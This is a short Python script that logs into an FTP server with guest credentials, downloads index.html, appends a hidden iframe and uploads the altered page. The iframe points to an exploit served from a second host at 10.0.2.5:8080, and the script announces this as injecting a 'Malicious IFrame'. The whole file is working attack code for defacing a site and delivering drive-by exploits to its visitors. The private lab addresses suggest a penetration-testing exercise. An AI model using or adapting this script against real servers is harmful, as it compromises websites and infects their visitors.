import ftplib

def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Downloaded Page: ' + page)

    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)

    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)

if __name__ == '__main__':
	host = '10.0.2.6'
	userName = 'guest'
	passWord = 'guest'
	ftp = ftplib.FTP(host)
	try:
		ftp.login(userName, passWord)
		redirect = '<iframe src="http:\\\\10.0.2.5:8080\\exploit"></iframe>'
		injectPage(ftp, 'index.html', redirect)
	except:
		print('[-] Error logging in.')
	
